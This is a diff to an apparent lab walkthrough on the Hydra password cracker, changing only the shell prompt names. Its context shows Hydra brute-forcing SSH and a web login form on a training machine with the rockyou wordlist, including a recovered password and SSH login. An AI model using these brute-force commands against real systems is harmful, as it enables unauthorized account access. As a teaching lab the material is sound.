@@ -11,7 +11,7 @@ For the purpose of this deployed machine, here are the commands to use Hydra on 
 [-h](https://i.imgur.com/D71vkKM.png)
 
 ```console
-kali@kali:~$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.39.3 -t 4 ssh
+bibo318@parrot:~$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.39.3 -t 4 ssh
 Hydra v9.1-dev (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-03 12:51:58
@@ -20,7 +20,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-03 12:51:
 [22][ssh] host: 10.10.39.3   login: molly   password: butterfly
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-03 12:52:51
-kali@kali:~$ ssh molly@10.10.39.3
+bibo318@parrot:~$ ssh molly@10.10.39.3
 The authenticity of host '10.10.39.3 (10.10.39.3)' can't be established.
 ECDSA key fingerprint is SHA256:CvZ/M3lLX1Nv/BtNNW9Cb+JYa2z85ldNGQdNp0HwQ9U.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -59,7 +59,7 @@ Below is an example Hydra command to brute force a POST login form:
 
 
 ```console
-kali@kali:~$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.39.3 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect."
+bibo318@parrot:~$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.39.3 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect."
 Hydra v9.1-dev (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-03 13:09:26
